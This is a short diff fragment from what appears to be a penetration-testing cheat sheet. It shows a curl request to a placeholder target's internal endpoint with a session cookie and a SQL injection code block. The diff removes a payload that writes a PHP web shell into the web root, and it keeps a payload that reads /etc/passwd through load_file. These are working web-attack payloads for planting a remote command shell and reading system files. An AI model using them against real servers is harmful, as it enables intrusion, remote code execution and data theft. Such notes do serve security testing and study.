@@ -135,7 +135,6 @@ $ curl -X POST "http://<target>/internal/testConnection;" -H "Cookie: JSESSIONID
 
 {% code overflow="wrap" %}
 ```sql
-SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
 SELECT load_file("/etc/passwd") from information_schema
 ...
 
